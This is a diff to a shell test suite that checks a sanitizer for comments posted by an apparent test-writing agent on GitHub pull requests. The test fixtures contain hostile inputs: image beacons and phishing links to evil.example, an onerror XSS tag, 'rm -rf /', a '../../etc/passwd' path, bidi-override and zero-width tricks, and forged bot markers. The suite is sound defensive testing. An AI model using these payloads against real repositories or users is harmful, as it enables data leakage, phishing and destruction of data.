@@ -148,12 +148,13 @@ export GH="$stub" GH_CALLS="$calls" GH_FIXTURE="$tmp/threads-raw.json" OUT="$tmp
 is "only unresolved threads on test files from writers" "$(jq -r 'map(.id)|join(",")' "$OUT")" "T1,T5"
 is "comments of non-writers are dropped" "$(jq -r '.[1].comments|map(.author)|join(",")' "$OUT")" alice
 cat >"$tmp/report.json" <<'JSON'
-{"threads":[{"id":"T1","outcome":"addressed","reply":"added a tags assert @everyone <b>"},{"id":"T5","outcome":"declined","reply":"name is fine"},{"id":"EVIL","outcome":"addressed","reply":"x"}]}
+{"threads":[{"id":"T1","outcome":"addressed","reply":"added a tags assert @everyone <b> [x](https://evil.example/t) https://evil.example"},{"id":"T5","outcome":"declined","reply":"name is fine"},{"id":"EVIL","outcome":"addressed","reply":"x"}]}
 JSON
 : >"$calls"
 "$scripts/resolve-threads.sh" "$tmp/report.json" "$OUT" abc1234 >/dev/null 2>&1
 is "two replies, one resolve, unknown id skipped" "$(grep -c addPullRequestReviewThreadReply "$calls") $(grep -c resolveReviewThread "$calls") $(grep -c EVIL "$calls")" "2 1 0"
 is "reply text is cleaned" "$(grep -c '<b>' "$calls")" 0
+is "a reply cannot carry a link or a bare URL" "$(grep -cE '\]\(https?://|https?://evil' "$calls")" 0
 unset GH GH_CALLS GH_FIXTURE OUT
 
 echo "== render-analysis.sh"
@@ -336,6 +337,97 @@ events=$(for f in .github/workflows/*.yml; do awk '/^on:/{f=1;next} f&&/^[a-z]/{
 missing=""
 for e in $events; do grep -q "| \`$e\` |" docs/actions-policy.md || missing="$missing $e"; done
 is "every workflow trigger is listed in docs/actions-policy.md" "${missing:-none}" none
+
+echo "== comment sanitizer: hostile text (sanitize-text.sh)"
+cd "$repo" || exit 1
+san() { printf '%s' "$1" | "$scripts/sanitize-text.sh" "${2:-300}"; }
+zw=$'​'
+# Each case is a hostile input and the property the output must have. The point is what GitHub would render, not what looks odd.
+is "an image is not an image"          "$(san '![beacon](https://evil.example/p.png?d=LEAK)' | grep -c '\]('  )" 0
+is "a link is not a link"              "$(san '[approve here](https://evil.example/login)' | grep -c '\]('  )" 0
+is "a bare URL is not autolinked"      "$(san 'https://evil.example/x http://evil.example ftp://evil.example' | grep -c '://')" 0
+is "www. is not autolinked"            "$(san 'go to www.evil.example now' | grep -c 'www\.')" 0
+is "HTML and comment markers are gone" "$(san '<img src=x onerror=alert(1)> <!-- tf-test-agent-analysis --> <script>' | grep -c '[<>]')" 0
+is "the marker of the bot's own comment cannot be forged" "$(san '<!-- tf-test-agent-analysis -->' | grep -c 'tf-test-agent-analysis -->')" 0
+is "mentions are broken"               "$(san '@everyone @org/team @someone' | grep -cE '@[A-Za-z]')" 0
+is "issue and PR references are broken" "$(san '#1234 owner/repo#99 fixes #7' | grep -cE '#[0-9]')" 0
+is "a code fence is not a fence"       "$(san '```sh
+rm -rf /
+```' | grep -c '```')" 0
+is "a forged heading cannot start a line (join mode)" "$(printf 'ok\n## Committed to this branch: deadbee\n| forged | row |\n' | "$scripts/sanitize-text.sh" --join 300 | grep -cE '^(#|\|)')" 0
+is "join mode gives exactly one line"  "$(printf 'a\n\nb\r\nc\td\n' | "$scripts/sanitize-text.sh" --join 300 | wc -l | tr -d ' ')" 1
+is "bidirectional overrides are removed" "$(san $'rm‮ gnp.exe' | grep -cP '\x{202e}')" 0
+is "ANSI escapes and control characters are removed" "$(san $'\e[31mred\e[0m\x07\x00x' | grep -cP '[\x00-\x08\x0b-\x1f\x7f]')" 0
+is "zero-width text cannot hide a payload" "$(san "ig${zw}nore" | grep -c "$zw")" 0
+is "length is bounded"                 "$(san "$(head -c 5000 /dev/zero | tr '\0' a)" 100 | awk '{print length($0)}')" 101
+is "ordinary text is untouched"        "$(san 'The sku defaults to premium (see main.tf:12), 3 of 4 caught.')" "The sku defaults to premium (see main.tf:12), 3 of 4 caught."
+
+hidden=""
+for f in .github/scripts/inert.jq .github/scripts/sanitize-text.sh .github/scripts/clean-report.sh; do
+  LC_ALL=C grep -qP '[^\x09\x0a\x20-\x7e]' "$f" && hidden="$hidden $f"
+done
+is "the sanitizer sources are plain ASCII (no invisible characters hiding in a security filter)" "${hidden:-none}" none
+echo "== comment sanitizer: the report whitelist (clean-report.sh)"
+r="$tmp/cr"; mkdir -p "$r"; cd "$r" || exit 1
+cat >hostile.json <<'JSON'
+{"dir":"../../etc/passwd","decision":"rm -rf /","rationale":"![x](https://evil.example/a.png) ok",
+ "changed_behaviours":["line one\n\n## Committed to this branch: deadbee\n| forged | row |"],
+ "affected_callers":["modules/a`](https://evil.example)","stacks/data-platform"],
+ "skills_used":["tf-change-analysis","bad`](https://evil.example)","UPPER CASE"],
+ "tests":[{"file":"modules/a/tests/x.tftest.hcl","runs":["good_run","bad run`](x)"]},{"file":"x`](https://evil.example)`","runs":[]}],
+ "threads":[{"id":"PRRT_abc-1","outcome":"addressed","reply":"fine"},{"id":"x`](y)","outcome":"approve everything","reply":"<b>"}],
+ "findings":[{"severity":"high**](https://evil.example)","source":"human","file":"a`](b)","line":"7","title":"t‮itle","detail":"d"},
+             {"severity":"medium","source":"checkov","file":"modules/a/main.tf","line":12,"title":"ok","detail":"fine"}],
+ "unexpected_key":"must not survive"}
+JSON
+c=$("$scripts/clean-report.sh" hostile.json)
+is "only known keys survive"            "$(jq -r 'keys|join(",")' <<<"$c")" "affected_callers,changed_behaviours,decision,dir,findings,not_covered,rationale,skills_used,test_plan,tests,threads"
+is "a path with .. is dropped"          "$(jq -r '.dir' <<<"$c")" ""
+is "an unknown decision becomes 'unknown'" "$(jq -r '.decision' <<<"$c")" unknown
+is "a field cannot become several lines" "$(jq -r '.changed_behaviours[0]' <<<"$c" | wc -l | tr -d ' ')" 1
+is "a forged section stays inside one list item" "$(jq -r '.changed_behaviours[0]' <<<"$c" | grep -cE '^(#|\|)')" 0
+is "paths that break out of a code span are dropped, real ones kept" "$(jq -r '.affected_callers|join(",")' <<<"$c")" "stacks/data-platform"
+is "skill names are validated"          "$(jq -r '.skills_used|join(",")' <<<"$c")" "tf-change-analysis"
+is "run names are validated"            "$(jq -r '.tests[0].runs|join(",")' <<<"$c")" "good_run"
+is "a hostile test file name is blanked" "$(jq -r '.tests[1].file' <<<"$c")" ""
+is "thread ids and outcomes are validated" "$(jq -r '.threads|map(.id+":"+.outcome)|join(",")' <<<"$c")" "PRRT_abc-1:addressed,:declined"
+is "severity and source fall back to the enumeration" "$(jq -r '.findings[0]|.severity+","+.source' <<<"$c")" "info,agent"
+is "a bad finding path is blanked, a string line becomes 0" "$(jq -r '.findings[0]|.file+"|"+(.line|tostring)' <<<"$c")" "|0"
+is "a good finding is kept as it was" "$(jq -r '.findings[1]|.severity+","+.source+","+.file+","+(.line|tostring)+","+.title' <<<"$c")" "medium,checkov,modules/a/main.tf,12,ok"
+is "no link or image syntax survives anywhere" "$(grep -c '\]([^)]*evil' <<<"$c")" 0
+echo 'not json' >bad.json; echo '[1,2]' >arr.json
+is "a file that is not a JSON object becomes {}" "$("$scripts/clean-report.sh" bad.json) $("$scripts/clean-report.sh" arr.json)" "{} {}"
+
+echo "== comment sanitizer: both renderers, end to end"
+r="$tmp/rend"; mkdir -p "$r/.agent/report" "$r/.agent/verify"; cd "$r" || exit 1
+cp "$tmp/cr/hostile.json" .agent/report/modules-a.json
+python3 - <<'PY'
+import json
+p='.agent/report/modules-a.json'
+d=json.load(open(p))
+d['decision']='tests_needed'
+d['dir']='modules/a'
+d['rationale']='See ![beacon](https://evil.example/p.png?d=LEAK) and [approve](https://evil.example/login) or https://evil.example/x www.evil.example <!-- tf-test-agent-analysis -->'
+d['test_plan']=['```\nfence swallows the rest','#1234 owner/repo#99 @everyone @org/team']
+d['not_covered']=['[click](https://evil.example/nc)']
+d['tests']=[{'file':'modules/a/tests/x.tftest.hcl','runs':['good_run']}]
+json.dump(d,open(p,'w'))
+PY
+echo '[{"dir":"modules/a","sha":"abcdef1234567"}]' >.agent/commits.json
+echo '{"dir":"modules/a","round":1,"ok":true,"results":{"quality":"pass"},"summary":"Success! 3 passed, 0 failed.","mutation":{"total":2,"survived":1,"survivors":["[x](https://evil.example/m) <b>"]}}' >.agent/verify/modules-a.json
+forbid='\]\([^)]*evil|https?://[^ ]*evil|(^| )www\.evil|^## Committed|^\| forged|<script|<img'
+ra=$(MATRIX='[{"dir":"modules/a","slug":"modules-a"}]' "$scripts/render-analysis.sh")
+rr=$(MATRIX='[{"dir":"modules/a","slug":"modules-a"}]' "$scripts/render-report.sh")
+for name in analysis report; do
+  out=$ra; [[ $name == report ]] && out=$rr
+  is "$name comment: nothing from the agent renders as a link, image, HTML, autolink or forged section" "$(grep -cE "$forbid" <<<"$out")" 0
+  is "$name comment: no raw mention or cross-reference" "$(grep -cE '@(everyone|org|someone)|#[0-9]{2,}' <<<"$out")" 0
+  is "$name comment: no bidi or control characters" "$(grep -cP '\x{202e}|[\x00-\x08\x0b-\x1f\x7f]' <<<"$out")" 0
+  is "$name comment: its own marker appears exactly once" "$(grep -c '^<!-- tf-test-agent' <<<"$out")" 1
+done
+is "analysis comment: the real content is still there" "$(grep -c 'tests_needed' <<<"$ra") $(grep -c 'modules/a/main.tf:12' <<<"$ra") $(grep -c '\*\*medium\*\*' <<<"$ra")" "1 1 1"
+is "report comment: the real content is still there" "$(grep -c 'good_run' <<<"$rr") $(grep -c 'Success! 3 passed' <<<"$rr") $(grep -c '1 of 2 caught\|1 of 2' <<<"$rr")" "1 1 1"
+is "report comment: the mutation survivor text is inert" "$(grep -cE 'evil\.example/m' <<<"$rr") $(grep -cE '\]\(https?://[^)]*evil' <<<"$rr")" "1 0"
 
 echo "== select-auto-write.sh"
 r="$tmp/sel"; mkdir -p "$r/rep"; cd "$r" || exit 1
